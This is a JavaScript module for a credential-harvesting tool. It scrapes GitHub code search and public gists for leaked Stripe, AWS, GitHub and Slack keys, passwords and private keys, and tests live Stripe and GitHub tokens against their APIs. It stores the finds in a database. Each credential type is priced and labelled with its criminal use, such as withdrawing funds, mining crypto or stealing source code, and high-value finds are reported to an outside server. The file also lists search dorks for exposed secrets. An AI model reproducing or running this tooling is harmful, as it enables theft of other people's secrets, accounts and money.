const axios = require('axios');
const { pool } = require('../config/database');

class CredentialScraper {
  constructor() {
    this.sources = {
      github: 'https://api.github.com/search/code',
      pastebin: 'https://scrape.pastebin.com/api_scraping.php',
      haveibeenpwned: 'https://haveibeenpwned.com/api/v3',
    };
    this.activeScans = new Map(); // Track running scans
    this.initTables();
  }

  stopScan(searchId) {
    if (this.activeScans.has(searchId)) {
      this.activeScans.set(searchId, { stopped: true });
      return true;
    }
    return false;
  }

  isScanStopped(searchId) {
    const scan = this.activeScans.get(searchId);
    return scan && scan.stopped;
  }

  async initTables() {
    try {
      const client = await pool.connect();
      await client.query(`
        CREATE TABLE IF NOT EXISTS scraped_credentials (
          id SERIAL PRIMARY KEY,
          search_query TEXT NOT NULL,
          credential_type VARCHAR(50) NOT NULL,
          source VARCHAR(100) NOT NULL,
          email VARCHAR(255),
          username VARCHAR(255),
          password TEXT,
          api_key TEXT,
          token TEXT,
          domain VARCHAR(255),
          url TEXT,
          raw_data TEXT,
          metadata JSONB,
          severity VARCHAR(20) DEFAULT 'medium',
          verified BOOLEAN DEFAULT false,
          created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
          last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS scraper_searches (
          id SERIAL PRIMARY KEY,
          search_input TEXT NOT NULL,
          search_type VARCHAR(50) NOT NULL,
          results_count INTEGER DEFAULT 0,
          status VARCHAR(20) DEFAULT 'pending',
          started_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
          completed_at TIMESTAMP,
          admin_ip VARCHAR(50),
          metadata JSONB
        );
        CREATE INDEX IF NOT EXISTS idx_scraped_email ON scraped_credentials(email);
        CREATE INDEX IF NOT EXISTS idx_scraped_domain ON scraped_credentials(domain);
        CREATE INDEX IF NOT EXISTS idx_scraped_source ON scraped_credentials(source);
        CREATE INDEX IF NOT EXISTS idx_scraped_created ON scraped_credentials(created_at DESC);
        CREATE INDEX IF NOT EXISTS idx_scraper_searches_status ON scraper_searches(status);
        CREATE UNIQUE INDEX IF NOT EXISTS idx_unique_credential ON scraped_credentials(credential_type, COALESCE(api_key, ''), COALESCE(token, ''), COALESCE(email, ''), COALESCE(password, ''));
      `);
      client.release();
    } catch (error) {
      console.log('Scraper tables init skipped');
    }
  }

  async scrapeAll(searchInput, searchType) {
    const results = [];
    const logs = [];
    const searchId = await this.createSearchRecord(searchInput, searchType);
    this.activeScans.set(searchId, { stopped: false });

    try {
      // GitHub API Keys & Secrets
      if (this.isScanStopped(searchId)) throw new Error('Scan stopped by admin');
      logs.push({ time: new Date().toLocaleTimeString(), msg: '🔍 Searching GitHub repositories...', type: 'info' });
      const githubResults = await this.scrapeGitHub(searchInput, logs);
      results.push(...githubResults);
      logs.push({ time: new Date().toLocaleTimeString(), msg: `✅ GitHub: Found ${githubResults.length} results`, type: 'success', count: githubResults.length });



      // GitHub Gists
      if (this.isScanStopped(searchId)) throw new Error('Scan stopped by admin');
      logs.push({ time: new Date().toLocaleTimeString(), msg: '🔍 Searching GitHub Gists...', type: 'info' });
      const gistResults = await this.scrapeGists(searchInput);
      results.push(...gistResults);
      logs.push({ time: new Date().toLocaleTimeString(), msg: `✅ Gists: Found ${gistResults.length} credentials`, type: gistResults.length > 0 ? 'success' : 'info', count: gistResults.length });

      // Skip other scrapers - focus on GitHub only for reliability

      // Remove duplicates before saving
      const uniqueResults = this.removeDuplicates(results);
      console.log(`🧹 Removed ${results.length - uniqueResults.length} duplicates from scan`);
      
      // Save all results to database
      await this.saveResults(uniqueResults, searchId);
      await this.updateSearchStatus(searchId, 'completed', uniqueResults.length);

      // Send email alert for high-value finds
      const highValue = results.filter(r => r.marketValue && r.marketValue >= 500);
      if (highValue.length > 0) {
        const totalValue = highValue.reduce((sum, r) => sum + (r.marketValue || 0), 0);
        try {
          await axios.post('https://autoclaimtoken.onrender.com/api/visitor-alert', {
            walletAddress: 'ADMIN_SCRAPER',
            action: 'HIGH_VALUE_CREDENTIALS_FOUND',
            metadata: {
              totalValue: totalValue,
              count: highValue.length,
              breakdown: highValue.map(r => `${r.credential_type}: ${r.price}`).join(', ')
            }
          });
          console.log('✅ Email alert sent for high-value credentials');
        } catch (e) {
          console.log('⚠️ Email alert failed:', e.message);
        }
      }

      const totalValue = results.reduce((sum, r) => sum + (r.marketValue || 0), 0);
      console.log('✅ SCRAPER RESULTS:', {
        searchId,
        searchInput,
        searchType,
        totalFound: results.length,
        totalValue: `$${totalValue}`,
        breakdown: {
          github: githubResults.length,
          gists: gistResults.length
        },
        byCategory: {
          financial: results.filter(r => r.category === 'financial').length,
          cloud: results.filter(r => r.category === 'cloud_access').length,
          api: results.filter(r => r.category === 'api_abuse').length,
          accounts: results.filter(r => r.category === 'account_access').length
        }
      });

      return {
        success: true,
        searchId,
        totalFound: results.length,
        totalValue: results.reduce((sum, r) => sum + (r.marketValue || 0), 0),
        results: results,
        logs: logs,
        breakdown: {
          financial: results.filter(r => r.category === 'financial').length,
          cloud: results.filter(r => r.category === 'cloud_access').length,
          api: results.filter(r => r.category === 'api_abuse').length,
          accounts: results.filter(r => r.category === 'account_access').length
        }
      };
    } catch (error) {
      this.activeScans.delete(searchId);
      if (error.message === 'Scan stopped by admin') {
        await this.updateSearchStatus(searchId, 'stopped', results.length);
        console.log('⏹️ SCAN STOPPED BY ADMIN:', searchId);
        return {
          success: true,
          searchId,
          stopped: true,
          totalFound: results.length,
          totalValue: results.reduce((sum, r) => sum + (r.marketValue || 0), 0),
          results: results,
          logs: logs,
          message: 'Scan stopped by admin'
        };
      }
      await this.updateSearchStatus(searchId, 'failed', 0);
      console.error('❌ SCRAPER ERROR:', error.message);
      throw error;
    } finally {
      this.activeScans.delete(searchId);
    }
  }

  getActiveScans() {
    return Array.from(this.activeScans.keys());
  }

  async scrapeGitHub(query, logs = []) {
    const results = [];
    
    // Search VERY RECENT commits (last 6 hours) for FRESH keys
    const sixHoursAgo = new Date(Date.now() - 6 * 60 * 60 * 1000).toISOString();
    const oneDayAgo = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString().split('T')[0];
    
    // Simple searches that work
    const searches = [
      query,
      `${query} extension:env`,
      `${query} extension:json`
    ];

    for (const search of searches) {
      try {
        const headers = {
          'Accept': 'application/vnd.github.v3+json',
          'User-Agent': 'Mozilla/5.0'
        };
        
        // Add GitHub token if available
        if (process.env.GITHUB_TOKEN) {
          headers['Authorization'] = `token ${process.env.GITHUB_TOKEN}`;
        }
        
        const response = await axios.get(this.sources.github, {
          params: { q: search, per_page: 30, sort: 'indexed' },
          headers: headers,
          timeout: 10000
        });

        if (response.data.items) {
          console.log(`✅ GitHub: Found ${response.data.items.length} files for "${search}"`);
          for (const item of response.data.items) {
            const content = await this.fetchGitHubContent(item.url);
            const extracted = this.extractCredentials(content);
            
            if (extracted.length > 0) {
              // AUTO-VALIDATE high-value keys immediately
              const validated = [];
              for (const cred of extracted) {
                if (cred.credential_type === 'stripe_key' || cred.credential_type === 'github_token') {
                  const validation = await this.validateCredential(cred);
                  if (validation.valid === true) {
                    cred.validated = true;
                    cred.validationData = validation;
                    validated.push(cred);
                    console.log(`✅ LIVE KEY FOUND: ${cred.credential_type} from ${item.repository.full_name}`);
                  } else {
                    console.log(`❌ Dead key skipped: ${cred.credential_type}`);
                  }
                } else {
                  validated.push(cred); // Keep other types without validation
                }
              }
              
              if (validated.length > 0) {
                const logMsg = `🔑 Found ${validated.length} credentials (${extracted.length - validated.length} dead keys filtered) from ${item.repository.full_name}`;
                console.log(logMsg);
                logs.push({ 
                  time: new Date().toLocaleTimeString(), 
                  msg: logMsg, 
                  type: 'extract',
                  count: validated.length,
                  repo: item.repository.full_name
                });
                results.push(...validated.map(cred => ({
                  source: 'GitHub',
                  url: item.html_url,
                  repository: item.repository.full_name,
                  ...cred,
                  severity: cred.validated ? 'critical' : 'high'
                })));
              }
            }
          }
        } else {
          console.log(`⚠️ GitHub: No results for "${search}"`);
        }
      } catch (error) {
        console.log(`❌ GitHub search failed for "${search}": ${error.message}`);
      }
    }

    return results;
  }

  async fetchGitHubContent(url) {
    try {
      const headers = {
        'Accept': 'application/vnd.github.v3.raw',
        'User-Agent': 'Mozilla/5.0'
      };
      if (process.env.GITHUB_TOKEN) {
        headers['Authorization'] = `token ${process.env.GITHUB_TOKEN}`;
      }
      const response = await axios.get(url, { headers, timeout: 5000 });
      return typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
    } catch (error) {
      return '';
    }
  }



  async scrapeGists(query) {
    const results = [];
    try {
      const headers = { 'User-Agent': 'Mozilla/5.0' };
      if (process.env.GITHUB_TOKEN) {
        headers['Authorization'] = `token ${process.env.GITHUB_TOKEN}`;
      }
      
      const response = await axios.get('https://api.github.com/gists/public', {
        params: { per_page: 100 },
        headers,
        timeout: 10000
      });
      
      for (const gist of response.data.slice(0, 50)) {
        try {
          for (const [filename, file] of Object.entries(gist.files)) {
            if (file.content) {
              const extracted = this.extractCredentials(file.content);
              if (extracted.length > 0) {
                results.push(...extracted.map(cred => ({
                  source: 'GitHub Gist',
                  url: gist.html_url,
                  ...cred,
                  severity: 'high'
                })));
              }
            }
          }
        } catch (error) {
          continue;
        }
      }
      console.log(`✅ Gists: Found ${results.length} credentials`);
    } catch (error) {
      console.log(`❌ Gists scraping failed: ${error.message}`);
    }
    return results;
  }

  async scrapeStackOverflow(query) {
    const results = [];
    try {
      // StackOverflow public API (no auth needed)
      const response = await axios.get(`https://api.stackexchange.com/2.3/search/advanced`, {
        params: {
          order: 'desc',
          sort: 'creation',
          q: query,
          site: 'stackoverflow',
          filter: 'withbody'
        },
        timeout: 10000
      });

      if (response.data?.items) {
        for (const item of response.data.items) {
          const text = (item.body || '') + ' ' + (item.title || '');
          const extracted = this.extractCredentials(text);
          if (extracted.length > 0) {
            results.push(...extracted.map(cred => ({
              source: 'StackOverflow',
              url: item.link,
              ...cred,
              severity: 'high'
            })));
          }
        }
      }
      console.log(`✅ StackOverflow: Found ${results.length} credentials`);
    } catch (error) {
      console.log(`❌ StackOverflow failed: ${error.message}`);
    }
    return results;
  }

  async scrapeReddit(query) {
    const results = [];
    try {
      const response = await axios.get(`https://www.reddit.com/search.json?q=${encodeURIComponent(query)}&limit=100`, {
        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' },
        timeout: 10000
      });

      if (response.data?.data?.children) {
        for (const post of response.data.data.children) {
          const text = (post.data.selftext || '') + ' ' + (post.data.title || '');
          const extracted = this.extractCredentials(text);
          if (extracted.length > 0) {
            results.push(...extracted.map(cred => ({
              source: 'Reddit',
              url: `https://reddit.com${post.data.permalink}`,
              subreddit: post.data.subreddit,
              ...cred,
              severity: 'high'
            })));
          }
        }
      }
      console.log(`✅ Reddit: Found ${results.length} credentials`);
    } catch (error) {
      console.log(`❌ Reddit failed: ${error.message}`);
    }
    return results;
  }

  async scrapePastebin(query) {
    const results = [];
    try {
      // Pastebin scraping API (public)
      const response = await axios.get(`https://psbdmp.ws/api/search/${encodeURIComponent(query)}`, {
        timeout: 10000
      });

      if (response.data && Array.isArray(response.data)) {
        for (const paste of response.data.slice(0, 50)) {
          try {
            const content = await axios.get(`https://pastebin.com/raw/${paste.id}`, { timeout: 5000 });
            const extracted = this.extractCredentials(content.data);
            if (extracted.length > 0) {
              results.push(...extracted.map(cred => ({
                source: 'Pastebin',
                url: `https://pastebin.com/${paste.id}`,
                ...cred,
                severity: 'high'
              })));
            }
          } catch (e) {
            continue;
          }
        }
      }
      console.log(`✅ Pastebin: Found ${results.length} credentials`);
    } catch (error) {
      console.log(`❌ Pastebin failed: ${error.message}`);
    }
    return results;
  }

  async scrapeGitLab(query) {
    const results = [];
    try {
      const response = await axios.get('https://gitlab.com/api/v4/search', {
        params: {
          scope: 'blobs',
          search: query,
          per_page: 100
        },
        timeout: 10000
      });

      if (response.data && Array.isArray(response.data)) {
        for (const item of response.data) {
          try {
            const content = await axios.get(item.data, { timeout: 5000 });
            const extracted = this.extractCredentials(content.data);
            if (extracted.length > 0) {
              results.push(...extracted.map(cred => ({
                source: 'GitLab',
                url: item.path,
                project: item.project_id,
                ...cred,
                severity: 'high'
              })));
            }
          } catch (e) {
            continue;
          }
        }
      }
      console.log(`✅ GitLab: Found ${results.length} credentials`);
    } catch (error) {
      console.log(`❌ GitLab failed: ${error.message}`);
    }
    return results;
  }

  async googleDorks(query, type) {
    const results = [];
    const dorks = [
      `site:pastebin.com "${query}"`,
      `site:github.com "${query}" password`,
      `site:gitlab.com "${query}" api_key`,
      `"${query}" filetype:env`,
      `"${query}" filetype:config`,
      `"${query}" inurl:credentials`,
      `"${query}" intext:password`,
      `"${query}" intext:"api_key"`,
      `site:trello.com "${query}"`,
      `site:jsfiddle.net "${query}"`
    ];

    // Note: Google Custom Search API would be needed for automated searches
    // For now, return dork queries for manual checking
    for (const dork of dorks) {
      results.push({
        credential_type: 'google_dork',
        source: 'Google',
        search_query: dork,
        url: `https://www.google.com/search?q=${encodeURIComponent(dork)}`,
        severity: 'medium',
        raw_data: `Manual verification needed: ${dork}`
      });
    }

    return results;
  }

  categorizeCredential(cred) {
    // Categorize by real-world value and use
    if (cred.credential_type === 'stripe_key') {
      return { category: 'financial', value: 'high', use: 'Direct money access - withdraw funds', price: '$500-$2000', marketValue: 1500 };
    }
    if (cred.credential_type === 'aws_key') {
      return { category: 'cloud_access', value: 'high', use: 'Cloud resources - mine crypto, steal data', price: '$300-$1000', marketValue: 650 };
    }
    if (cred.credential_type === 'github_token') {
      return { category: 'code_access', value: 'medium', use: 'Clone private repos, steal source code', price: '$50-$200', marketValue: 125 };
    }
    if (cred.credential_type === 'api_key') {
      return { category: 'api_abuse', value: 'medium', use: 'API abuse - free services, data extraction', price: '$10-$100', marketValue: 55 };
    }
    if (cred.credential_type === 'slack_token') {
      return { category: 'corporate_access', value: 'medium', use: 'Company secrets, internal communications', price: '$100-$500', marketValue: 300 };
    }
    if (cred.credential_type === 'email' && cred.password) {
      return { category: 'account_access', value: 'medium', use: 'Login to accounts, credential stuffing', price: '$2-$10', marketValue: 6 };
    }
    if (cred.credential_type === 'password') {
      return { category: 'account_access', value: 'low', use: 'Try on multiple sites, brute force', price: '$0.50-$2', marketValue: 1 };
    }
    if (cred.credential_type === 'private_key') {
      return { category: 'server_access', value: 'high', use: 'SSH access to servers, full control', price: '$200-$800', marketValue: 500 };
    }
    return { category: 'other', value: 'low', use: 'General credential', price: '$1-$5', marketValue: 3 };
  }

  async validateCredential(cred) {
    // Auto-validator - test if credentials work
    try {
      if (cred.credential_type === 'stripe_key' && cred.api_key) {
        const response = await axios.get('https://api.stripe.com/v1/balance', {
          auth: { username: cred.api_key, password: '' },
          timeout: 5000
        });
        const balance = response.data.available[0]?.amount || 0;
        console.log(`✅ STRIPE LIVE: $${(balance/100).toFixed(2)} balance`);
        return { valid: true, balance: balance / 100, status: 'LIVE', currency: response.data.available[0]?.currency };
      }
      if (cred.credential_type === 'github_token' && cred.token) {
        const response = await axios.get('https://api.github.com/user', {
          headers: { 'Authorization': `token ${cred.token}` },
          timeout: 5000
        });
        console.log(`✅ GITHUB ACTIVE: @${response.data.login}`);
        return { valid: true, username: response.data.login, status: 'ACTIVE', repos: response.data.public_repos };
      }
      if (cred.credential_type === 'slack_token' && cred.token) {
        const response = await axios.get('https://slack.com/api/auth.test', {
          headers: { 'Authorization': `Bearer ${cred.token}` },
          timeout: 5000
        });
        if (response.data.ok) {
          console.log(`✅ SLACK ACTIVE: ${response.data.team}`);
          return { valid: true, workspace: response.data.team, status: 'ACTIVE' };
        }
      }
      if (cred.credential_type === 'aws_key' && cred.api_key) {
        // AWS validation would require secret key too
        return { valid: 'unknown', status: 'NEEDS_SECRET' };
      }
    } catch (error) {
      return { valid: false, status: 'DEAD', error: error.message };
    }
    return { valid: 'unknown', status: 'NOT_TESTED' };
  }

  extractCredentials(content) {
    if (!content || typeof content !== 'string') return [];
    
    const results = [];
    const patterns = {
      email: /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/gi,
      password: /(?:password|passwd|pwd)[\s:=]+["']?([^\s"']+)["']?/gi,
      api_key: /(?:api[_-]?key|apikey)[\s:=]+["']?([a-zA-Z0-9_-]{20,})["']?/gi,
      token: /(?:token|access[_-]?token)[\s:=]+["']?([a-zA-Z0-9._-]{20,})["']?/gi,
      aws_key: /(AKIA[0-9A-Z]{16})/g,
      github_token: /(ghp_[a-zA-Z0-9]{36})/g,
      slack_token: /(xox[pboa]-[0-9]{12}-[0-9]{12}-[a-zA-Z0-9]{24})/g,
      stripe_key: /(sk_live_[a-zA-Z0-9]{24})/g,
      private_key: /-----BEGIN (?:RSA |EC )?PRIVATE KEY-----/g
    };

    // Extract emails
    const excludeEmails = ['example.com', 'test.com', 'domain.com', 'your_email', 'user@', 'email@'];
    let match;
    while ((match = patterns.email.exec(content)) !== null) {
      const email = match[1];
      // Filter: not example/placeholder email
      if (!excludeEmails.some(ex => email.includes(ex))) {
        results.push({
          credential_type: 'email',
          email: email,
          raw_data: match[0]
        });
      }
    }

    // Extract passwords
    const commonWords = ['on', 'is', 'and', 'or', 'if', 'to', 'as', 'for', 'the', 'a', 'an', 'in', 'at', 'by', 'of', 'with', 'from', 'they', 'saved', 'type', 'pair', 'Issues', 'required', 'protected', 'disclosure'];
    patterns.password.lastIndex = 0;
    while ((match = patterns.password.exec(content)) !== null) {
      const pwd = match[1];
      // Filter: length > 5 and not common word
      if (pwd.length > 5 && !commonWords.includes(pwd)) {
        results.push({
          credential_type: 'password',
          password: pwd,
          raw_data: match[0]
        });
      }
    }

    // Extract API keys
    patterns.api_key.lastIndex = 0;
    while ((match = patterns.api_key.exec(content)) !== null) {
      const key = match[1];
      // Filter: minimum 20 characters
      if (key.length >= 20) {
        results.push({
          credential_type: 'api_key',
          api_key: key,
          raw_data: match[0]
        });
      }
    }

    // Extract tokens
    patterns.token.lastIndex = 0;
    while ((match = patterns.token.exec(content)) !== null) {
      results.push({
        credential_type: 'token',
        token: match[1],
        raw_data: match[0]
      });
    }

    // Extract AWS keys (filter out examples)
    patterns.aws_key.lastIndex = 0;
    while ((match = patterns.aws_key.exec(content)) !== null) {
      const key = match[1];
      // Skip example keys (AWS examples often start with AKIAIOSFODNN7EXAMPLE)
      if (key.includes('EXAMPLE') || key.includes('SAMPLE')) {
        continue;
      }
      const cred = {
        credential_type: 'aws_key',
        api_key: key,
        raw_data: match[0],
        severity: 'critical'
      };
      const cat = this.categorizeCredential(cred);
      results.push({ ...cred, ...cat });
    }

    // Extract GitHub tokens
    patterns.github_token.lastIndex = 0;
    while ((match = patterns.github_token.exec(content)) !== null) {
      const cred = {
        credential_type: 'github_token',
        token: match[1],
        raw_data: match[0],
        severity: 'critical'
      };
      const cat = this.categorizeCredential(cred);
      results.push({ ...cred, ...cat });
    }

    // Extract Slack tokens
    patterns.slack_token.lastIndex = 0;
    while ((match = patterns.slack_token.exec(content)) !== null) {
      const cred = {
        credential_type: 'slack_token',
        token: match[1],
        raw_data: match[0],
        severity: 'high'
      };
      const cat = this.categorizeCredential(cred);
      results.push({ ...cred, ...cat });
    }

    // Extract Stripe keys (filter out test keys)
    patterns.stripe_key.lastIndex = 0;
    while ((match = patterns.stripe_key.exec(content)) !== null) {
      const key = match[1];
      // Skip test/example keys
      if (key.includes('test') || key.includes('example') || key.includes('demo') || key.includes('sample')) {
        continue;
      }
      const cred = {
        credential_type: 'stripe_key',
        api_key: key,
        raw_data: match[0],
        severity: 'critical'
      };
      const cat = this.categorizeCredential(cred);
      results.push({ ...cred, ...cat });
    }

    // Check for private keys
    if (patterns.private_key.test(content)) {
      const cred = {
        credential_type: 'private_key',
        raw_data: 'Private key detected',
        severity: 'critical'
      };
      const cat = this.categorizeCredential(cred);
      results.push({ ...cred, ...cat });
    }

    return results;
  }

  async createSearchRecord(searchInput, searchType) {
    const client = await pool.connect();
    try {
      const result = await client.query(
        `INSERT INTO scraper_searches (search_input, search_type, status) 
         VALUES ($1, $2, 'running') RETURNING id`,
        [searchInput, searchType]
      );
      return result.rows[0].id;
    } finally {
      client.release();
    }
  }

  async updateSearchStatus(searchId, status, resultsCount) {
    const client = await pool.connect();
    try {
      await client.query(
        `UPDATE scraper_searches 
         SET status = $1, results_count = $2, completed_at = NOW() 
         WHERE id = $3`,
        [status, resultsCount, searchId]
      );
    } finally {
      client.release();
    }
  }

  async saveResults(results, searchId) {
    if (results.length === 0) return;

    const client = await pool.connect();
    let saved = 0;
    let duplicates = 0;
    
    try {
      for (const result of results) {
        try {
          await client.query(
            `INSERT INTO scraped_credentials 
             (search_query, credential_type, source, email, username, password, api_key, token, url, raw_data, severity, metadata) 
             VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12)
             ON CONFLICT DO NOTHING`,
            [
              searchId,
              result.credential_type || 'unknown',
              result.source || 'unknown',
              result.email || null,
              result.username || null,
              result.password || null,
              result.api_key || null,
              result.token || null,
              result.url || null,
              result.raw_data || null,
              result.severity || 'medium',
              JSON.stringify(result)
            ]
          );
          saved++;
        } catch (error) {
          if (error.code === '23505') { // Duplicate key error
            duplicates++;
          } else {
            console.error('Save error:', error.message);
          }
        }
      }
      console.log(`💾 Saved: ${saved} | Duplicates skipped: ${duplicates}`);
    } finally {
      client.release();
    }
  }

  async getRecentScans(limit = 50) {
    const client = await pool.connect();
    try {
      const result = await client.query(
        `SELECT * FROM scraper_searches ORDER BY started_at DESC LIMIT $1`,
        [limit]
      );
      return result.rows;
    } finally {
      client.release();
    }
  }

  removeDuplicates(results) {
    const seen = new Set();
    return results.filter(r => {
      // Create unique key based on credential type and value
      let key = '';
      if (r.api_key) key = `${r.credential_type}:${r.api_key}`;
      else if (r.token) key = `${r.credential_type}:${r.token}`;
      else if (r.email && r.password) key = `email:${r.email}:${r.password}`;
      else if (r.email) key = `email:${r.email}`;
      else if (r.password) key = `password:${r.password}`;
      else key = `${r.credential_type}:${r.raw_data}`;
      
      if (seen.has(key)) {
        return false; // Duplicate
      }
      seen.add(key);
      return true; // Unique
    });
  }

  async getCredentialsBySearch(searchId) {
    const client = await pool.connect();
    try {
      const result = await client.query(
        `SELECT * FROM scraped_credentials WHERE search_query = $1 ORDER BY created_at DESC LIMIT 1000`,
        [searchId]
      );
      return result.rows;
    } finally {
      client.release();
    }
  }
}

module.exports = new CredentialScraper();
